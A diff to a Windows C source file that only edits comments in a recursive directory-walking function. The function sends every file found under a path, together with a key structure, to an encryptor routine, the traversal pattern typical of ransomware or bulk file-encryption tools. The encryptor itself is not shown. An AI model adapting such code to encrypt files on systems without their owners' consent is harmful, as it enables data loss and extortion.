@@ -4,13 +4,13 @@
 
 int getTree(char* path, key keyStruct) {
 
-	//add \* to path 
+	// Add "\*" to path 
 	int targetPathLen = (strlen(path) + 3);
 	char* targetPath = (char*)malloc(targetPathLen);
 	strcpy_s(targetPath, targetPathLen, path);
 	strcat_s(targetPath, targetPathLen, "\\*");
 
-	//get first file
+	// Initialize search handle and file data struct
 	HANDLE hSearch;
 	WIN32_FIND_DATA fileData;
 	hSearch = FindFirstFileA(targetPath, &fileData);
@@ -18,35 +18,40 @@ int getTree(char* path, key keyStruct) {
 		printf("\n Error getting first file - %lu", GetLastError());
 	}
 
+	// Iterate through files and directories in path
 	do {
 		if (strcmp(fileData.cFileName, ".") != 0 && strcmp(fileData.cFileName, "..") != 0) {
-			//check if file is dir
+			
+			// Check if file is dir
 			if (fileData.dwFileAttributes == 16) {
-
 				printf("\nFound folder %s\\%s\n", path, fileData.cFileName);
 
-				//making dir path
+				// Making new directory path for recursion
 				int foundDirLen = (strlen(path) + strlen(fileData.cFileName) + 2);
 				char* foundDir = (char*)malloc(foundDirLen);
 				strcpy_s(foundDir, foundDirLen, path);
 				strcat_s(foundDir, foundDirLen, "\\");
 				strcat_s(foundDir, foundDirLen, fileData.cFileName);
 				
-				//recurursion
+				// Recursion
 				getTree(foundDir, keyStruct);
 				free(foundDir);
 			} else {
-				//making file path
+
+				// Making file path for encryptor
 				int foundFileLen = (strlen(path) + strlen(fileData.cFileName) + 2);
 				char* foundFile = (char*)malloc(foundFileLen);
 				strcpy_s(foundFile, foundFileLen, path);
 				strcat_s(foundFile, foundFileLen, "\\");
 				strcat_s(foundFile, foundFileLen, fileData.cFileName);
-				//encryypt
+				
+				// Send found file path to encryptor
 				encryptor(foundFile, keyStruct);
 			}
 		}
 	} while (FindNextFileA(hSearch, &fileData));
+	
+	// Cleaning up once recursion is done
 	FindClose(hSearch);
 	free(targetPath);
 
